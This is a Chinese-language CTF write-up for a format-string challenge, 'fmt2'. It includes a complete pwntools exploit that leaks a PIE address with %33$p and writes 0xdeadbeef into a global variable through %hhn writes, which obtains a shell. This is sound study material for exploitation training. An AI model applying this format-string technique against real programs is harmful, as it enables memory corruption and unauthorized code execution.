# fmt2

## 题目简述

程序循环执行 `printf(buf)`，并在全局变量 `a` 等于 `0xdeadbeef` 时启动 shell。二进制启用了 PIE，因此先用格式化字符串泄露代码地址并计算加载基址，再把目标值按小端序逐字节写入 `a`。

## 解题过程

栈枚举表明 `%33$p` 泄露的是模块内偏移 `0x1280` 对应的代码指针，因此：

```text
elf_base = leak - 0x1280
a_address = elf_base + 0x4048
```

目标字节按低地址到高地址依次为 `ef be ad de`。把四个目标地址追加在格式串后，它们分别位于第 12 到 15 个参数；用 `%hhn` 写每个低字节。累计输出量按模 256 计算，所需增量依次是 239、207、239、49。

```python
from pwn import *

context(arch="amd64", os="linux")
io = process("../dist/fmt2")

io.sendlineafter(b"content: ", b"%33$p")
leak = int(io.recvline().strip(), 16)
elf_base = leak - 0x1280
target = elf_base + 0x4048

payload = (
    b"%239c%12$hhn"
    b"%207c%13$hhn"
    b"%239c%14$hhn"
    b"%49c%15$hhn"
    b"A"  # 使后续地址按 8 字节对齐
)
payload += b"".join(p64(target + i) for i in range(4))

io.sendafter(b"content: ", payload)
io.interactive()
```

循环结构让泄露和写入可以分两轮完成，不需要把所有操作塞进一次 `printf`。

## 方法总结

PIE 下应先取得模块内指针并减去已知静态偏移，再计算全局目标地址。多字节格式化写入需要同时控制小端字节顺序、累计输出量的模回绕、参数序号和地址对齐；这些值都应在目标附件上重新枚举，而不能机械套用其他编译版本。
